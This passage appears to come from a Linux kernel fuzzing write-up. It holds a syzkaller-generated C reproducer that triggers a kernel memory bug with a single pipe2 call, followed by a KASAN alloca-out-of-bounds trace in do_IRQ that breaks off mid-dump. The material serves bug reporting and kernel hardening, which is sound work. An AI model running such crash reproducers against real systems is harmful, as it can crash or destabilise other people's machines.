<signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <errno.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/prctl.h>\n#include <sys/resource.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\n  static void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\n  static void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void loop();\n\nstatic void sandbox_common()\n{\n\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\tsetpgrp();\n\tsetsid();\n\n\tstruct rlimit rlim;\n\trlim.rlim_cur = rlim.rlim_max = 128 << 20;\n\tsetrlimit(RLIMIT_AS, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 8 << 20;\n\tsetrlimit(RLIMIT_MEMLOCK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_FSIZE, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_STACK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 0;\n\tsetrlimit(RLIMIT_CORE, &rlim);\n\n#define CLONE_NEWCGROUP 0x02000000\n\n\tif (unshare(CLONE_NEWNS)) {\n\t}\n\tif (unshare(CLONE_NEWIPC)) {\n\t}\n\tif (unshare(CLONE_NEWCGROUP)) {\n\t}\n\tif (unshare(CLONE_NEWUTS)) {\n\t}\n\tif (unshare(CLONE_SYSVSEM)) {\n\t}\n}\n\nstatic int do_sandbox_none(void)\n{\n\tif (unshare(CLONE_NEWPID)) {\n\t}\n\tint pid = fork();\n\tif (pid < 0)\n\t\tfail(\"sandbox fork failed\");\n\tif (pid)\n\t\treturn pid;\n\n\tsandbox_common();\n\tif (unshare(CLONE_NEWNET)) {\n\t}\n\n\tloop();\n\tdoexit(1);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop()\n{\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nuint64_t procid;\nvoid test()\n{\n\tsyscall(__NR_pipe2, 0x20000040, 0x4000);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (procid = 0; procid < 8; procid++) {\n\t\tif (fork() == 0) {\n\t\t\tfor (;;) {\n\t\t\t\tif (chdir(cwd))\n\t\t\t\t\tfail(\"failed to chdir\");\n\t\t\t\tuse_temporary_dir();\n\t\t\t\tint pid = do_sandbox_none();\n\t\t\t\tint status = 0;\n\t\t\t\twhile (waitpid(pid, &status, __WALL) != pid) {}\n\t\t\t}\n\t\t}\n\t}\n\tsleep(1000000);\n\treturn 0;\n}\n```\n\nfunny, just one call, ```pipe2```.\n\n## do_irq - alloca Out Of Bounds\n\n### Call Trace (Dump)\n\n```c\n[  144.100193] BUG: KASAN: alloca-out-of-bounds in do_IRQ+0x14f/0x190\n[  144.102273] Read of size 8 at addr ffff880071feef50 by task syz-executor7/3009\n[  144.105120] \n[  144.105718] CPU: 0 PID: 3009 Comm: syz-executor7 Not tainted 4.16.0-rc3+ #5\n[  144.108306] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  144.111094] Call Trace:\n[  144.111818]  <IRQ>\n[  144.112451]  dump_stack+0x127/0x213\n[  144.113456]  ? _atomic_dec_and_lock+0x18d/0x18d\n[  144.115195]  ? show_regs_print_info+0x12/0x12\n[  144.117092]  ? do_IRQ+0x14f/0x190\n[  144.118988]  print_address_description+0x60/0x22b\n[  144.121262]  ? do_IRQ+0x14f/0x190\n[  144.122434]  kasan_report.cold.6+0xac/0x2f4\n[  144.123688]  ? do_IRQ+0x14f/0x190\n[  144.125633]  ? common_interrupt+0xf/0xf\n[  144.128281]  </IRQ>\n[  144.129024]  ? crypto_shash_update+0x23d/0x2a0\n[  144.133518]  ? kasan_unpoison_shadow+0x4/0x40\n[  144.134680]  ? crypto_shash_update+0x24d/0x2a0\n[  144.135996]  ? ext4_inode_csum.isra.59+0x562/0xef0\n[  144.137176]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0\n[  144.138826]  ? _rcu_barrier+0x1850/0x1d60\n[  144.147204]  ? _cond_resched+0x10/0x20\n[  144.148327]  ? _cond_resched+0x10/0x20\n[  144.149289]  ? __getblk_gfp+0xf2/0xa30\n[  144.150261]  ? save_trace+0x300/0x300\n[  144.151229]  ? map_id_up+0x178/0x3a0\n[  144.152122]  ? make_kprojid+0x30/0x30\n[  144.152970]  ? lock_downgrade+0x6d0/0x6d0\n[  144.153854]  ? find_held_lock+0x33/0x1b0\n[  144.154777]  ? from_kprojid+0x89/0xc0\n[  144.155620]  ? ext4_inode_csum_set+0x17c/0x370\n[  144.156750]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0\n[  144.158064]  ? ext4_chunk_trans_blocks+0x20/0x20\n[  144.159246]  ? jbd2_write_access_granted.part.8+0x264/0x410\n[  144.163218]  ? jbd2_journal_file_inode+0x5d0/0x5d0\n[  144.164486]  ? rcu_note_context_switch+0x710/0x710\n[  144.165676]  ? jbd2_journal_get_write_access+0x98/0xb0\n[  144.166916]  ? __ext4_journal_get_write_access+0x143/0x200\n[  144.168336]  ? ext4_mark_inode_dirty+0x220/0xac0\n[  144.169455]  ? ext4_evict_inode+0xb33/0x19d0\n[  144.170611]  ? ext4_expand_extra_isize+0x560/0x560\n[  144.171777]  ? __lock_is_held+0xad/0x140\n[  144.172798]  ? ext4_xattr_ensure_credits+0x81/0x320\n[  144.173967]  ? ext4_xattr_delete_inode+0x269/0xe20\n[  144.175159]  ? ext4_evict_inode+0x8f6/0x19d0\n[  144.176233]  ? ext4_expand_extra_isize_ea+0x1a20/0x1a20\n[  144.177557]  ? __sb_start_write+0x16b/0x2f0\n[  144.178698]  ? __sb_start_write+0x171/0x2f0\n[  144.179765]  ? ext4_evict_inode+0xb33/0x19d0\n[  144.180905]  ? ext4_da_write_begin+0x1170/0x1170\n[  144.182053]  ? evict+0x45f/0x8f0\n[  144.182904]  ? lock_acquire+0x4a0/0x4a0\n[  144.183842]  ? wb_wakeup+0xc0/0xc0\n[  144.184705]  ? do_raw_spin_trylock+0x190/0x190\n[  144.185652]  ? bit_waitqueue+0x30/0x30\n[  144.186414]  ? ext4_da_write_begin+0x1170/0x1170\n[  144.187468]  ? evict+0x498/0x8f0\n[  144.188398]  ? destroy_inode+0x1e0/0x1e0\n[  144.189355]  ? iput+0x623/0xbc0\n[  144.193860]  ? lock_acquire+0x4a0/0x4a0\n[  144.202122]  ? rcu_read_lock_sched_held+0x102/0x120\n[  144.203252]  ? ext4_drop_inode+0x11e/0x400\n[  144.204290]  ? do_raw_spin_trylock+0x190/0x190\n[  144.205489]  ? _atomic_dec_and_lock+0xff/0x18d\n[  144.207104]  ? cpumask_local_spread+0x2c0/0x2c0\n[  144.210166]  ? fsnotify_grab_connector+0x18c/0x2e0\n[  144.212062]  ? iput+0x62b/0xbc0\n[  144.213507]  ? ext4_sync_fs+0xa00/0xa00\n[  144.215476]  ? dispose_list+0x390/0x390\n[  144.220125]  ? fsnotify_grab_connector+0x1bd/0x2e0\n[  144.223298]  ? fsnotify_recalc_mask.part.8+0xa0/0xa0\n[  144.230135]  ? fsnotify_first_mark+0x340/0x340\n[  144.231357]  ? dentry_unlink_inode+0x483/0x5b0\n[  144.232384]  ? release_dentry_name_snapshot+0x70/0x70\n[  144.233609]  ? lock_downgrade+0x6d0/0x6d0\n[  144.234590]  ? rcutorture_record_progress+0x10/0x10\n[  144.238561]  ? lock_acquire+0x4a0/0x4a0\n[  144.239920]  ? do_raw_spin_lock+0x1b0/0x1b0\n[  144.241197]  ? dput.part.24+0x23d/0x950\n[  144.242177]  ? d_delete+0x1ed/0x2c0\n[  144.243104]  ? vfs_rmdir+0x386/0x470\n[  144.244475]  ? do_rmdir+0x41c/0x5b0\n[  144.245746]  ? user_path_create+0x40/0x40\n[  144.247270]  ? __do_page_fault+0x4a3/0xe30\n[  144.248801]  ? exit_to_usermode_loop+0x16d/0x230\n[  144.250478]  ? exit_to_usermode_loop+0x1c6/0x230\n[  144.251700]  ? syscall_slow_exit_work+0x4d0/0x4d0\n[  144.252955]  ? do_syscall_64+0xb0/0x850\n[  144.254232]  ? SyS_mkdir+0x2c0/0x2c0\n[  144.255074]  ? do_syscall_64+0x25b/0x850\n[  144.255911]  ? exit_to_usermode_loop+0x1c6/0x230\n[  144.257570]  ? syscall_return_slowpath+0x4e0/0x4e0\n[  144.259317]  ? syscall_return_slowpath+0x342/0x4e0\n[  144.261118]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  144.263090]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  144.264816]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  144.266695] \n[  144.267257] The buggy address belongs to the page:\n[  144.268975] page:ffffea0001c7fb80 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  144.271861] flags: 0x500000000000000()\n[  144.273191] raw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  144.275851] raw: ffffea0001c7fba0 ffffea0001c7fba0 0000000000000000 0000000000000000\n[  144.278015] page dumped because: kasan: bad access detected\n[  144.279598] \n[  144.280163] Memory state around the buggy address:\n[  144.281388]  ffff880071feee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.283488]  ffff880071feee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.285237] >ffff880071feef00: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb\n[  144.287223]                                                 